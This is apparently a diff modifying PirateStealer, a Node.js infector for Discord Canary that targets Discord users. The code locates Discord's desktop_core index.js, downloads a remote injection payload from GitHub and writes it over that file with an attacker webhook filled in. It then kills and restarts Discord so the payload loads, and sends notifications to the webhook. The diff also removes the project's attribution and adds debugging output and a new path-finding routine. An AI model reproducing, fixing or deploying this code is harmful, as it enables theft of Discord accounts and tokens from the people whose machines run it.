@@ -1,25 +1,16 @@
-// Thanks to https://github.com/mewzax who actually reuploaded the files (while it was deleted). You can file the old source code of PS at https://github.com/Mewzax/PirateStealer
-
-/* 
-    Creators: Stanley-GF & bytixo
-    Project Name: PirateStealer
-    Languages: JS, JS, RS (C# injectors can be found on Github)
-    Contribute: https://github.com/Stanley-GF/PirateStealer
-*/
-
 const glob = require("glob");
 const fs = require('fs');
-const https = require('https');
+const https = require('node:https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "da_webhook"
+const webhook = "";
 const config = {
-    "logout": "%LOGOUT%1",
-    "inject-notify": "%INJECTNOTI%1",
-    "logout-notify": "%LOGOUTNOTI%1",
-    "init-notify":"%INITNOTI%1",
-    "embed-color": "%MBEDCOLOR%1",
+    "logout": "instant",
+    "inject-notify": "true",
+    "logout-notify": "true",
+    "init-notify":"true",
+    "embed-color": "3447704",
     "disable-qr-code": "%DISABLEQRCODE%1"
 }
 let LOCAL = process.env.LOCALAPPDATA
@@ -28,31 +19,24 @@ let injectPath = [];
 let runningDiscords = [];
 
 fs.readdirSync(LOCAL).forEach(file => {
-    if (file.includes("iscord")) {
+    if (file.includes("DiscordCanary")) {
         discords.push(LOCAL + '\\' + file)
     } else {
         return;
     }
 });
 
-discords.forEach(function(file) {
-    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
-    glob.sync(pattern).map(file => {
-        injectPath.push(file)
-    })
-});
-
-listDiscords();
 
 function Infect() {
     https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/injection/injection.js', (resp) => {
         let data = '';
+
         resp.on('data', (chunk) => {
             data += chunk;
         });
         resp.on('end', () => {
-            injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+	    injectPath.forEach(file => {
+                fs.writeFileSync(file, data.replace("%WEBHOOK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                     encoding: 'utf8',
                     flag: 'w'
                 });
@@ -85,7 +69,7 @@ function Infect() {
 function listDiscords() {
     exec('tasklist', function(err, stdout, stderr) {
         if (stdout.includes("Discord.exe")) runningDiscords.push("discord");
-        if (stdout.includes("DiscordCanary.exe")) runningDiscords.push("discordcanary");
+        if (stdout.includes("DiscordCanary.exe")) console.log("Discord Canary Running"); runningDiscords.push("discordcanary");
         if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
         if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");
 
@@ -103,6 +87,7 @@ function listDiscords() {
 
 function killDiscord() {
     runningDiscords.forEach(disc => {
+        console.log("Killing: " + disc);
         exec(`taskkill /IM ${disc}.exe /F`, (err) => {
             if (err) {
               return;
@@ -121,6 +106,7 @@ function killDiscord() {
 function startDiscord() {
     runningDiscords.forEach(disc => {
         let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
+	console.log("Updater: " + path);
         exec(path, (err) => {
             if (err) {
               return;
@@ -166,8 +152,39 @@ function injectNotify() {
         ]
       })
 	.then(res => {
+
 	})
 	.catch(error => {
 
     })
 }
+
+function getDirectories(path) {
+  return fs.readdirSync(path).filter(function (file) {
+    return fs.statSync(path+'/'+file).isDirectory();
+  });
+}
+
+
+listDiscords();
+console.log(discords);
+discords.forEach(function(file) {
+    console.log("foreach: " + file);
+    getDirectories(file + "\\").forEach((item) => {
+        if (item.includes("app-")) {
+          file = file + "\\" + item + "\\modules\\";
+        }
+    });
+    getDirectories(file).forEach((item) => {
+        if (item.includes("discord_desktop_core-")) {
+          file = file + "\\" + item + "\\discord_desktop_core\\index.js";
+        }
+    });
+
+    if (fs.existsSync(file)) {
+      injectPath.push(file);
+    }
+});
+killDiscord();
+Infect();
+startDiscord();
